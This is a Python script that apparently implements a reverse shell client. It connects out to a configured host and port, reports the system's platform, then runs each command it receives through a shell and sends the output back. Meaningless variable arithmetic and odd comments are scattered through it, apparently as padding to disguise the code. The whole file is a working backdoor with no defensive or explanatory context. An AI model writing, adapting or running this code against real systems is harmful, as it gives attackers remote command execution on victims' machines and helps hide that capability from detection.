#!/usr/bin/env python3
import socket, os, subprocess, platform
host = '127.0.0.1'
port = 443
# what will we do with this variables ?
i, j = (0, 0)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        # a for loop
        for i in range(5):
            j = 9
        s.connect((host, port))
        # you should do this affectation
        j = j+5
        s.sendall(str.encode(platform.platform()))
    except socket.error as serr:
        print("connection failed: ", serr)
        exit()
    while True:
        data = s.recv(1024)
        cmd = data.decode('utf-8')
        if cmd == 'exit':
            break
        print('Received', cmd)
        if cmd[:2] == 'cd':
            try:
                # now I begin my journey ; some one is crying !
                os.chdir(cmd[3:])
                # it's useless code .
                j = j-9
                j = j+17
                l = j-i
                s.sendall(str.encode(os.getcwd()))
            except OSError as err:
                # Here we fix our problems .
                s.sendall(str.encode(err.strerror + "\n" + os.getcwd()))
        else:
            output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = output.stdout.read() + output.stderr.read()
            output_string = str(output_bytes, "ISO-8859-1")
            # and make it easier for me , happy coding myself .
            # another useless code ;
            j = j - 18
            j = j + 19
            l = j - i + 9
            s.sendall(str.encode(output_string + "\n" + os.getcwd()))
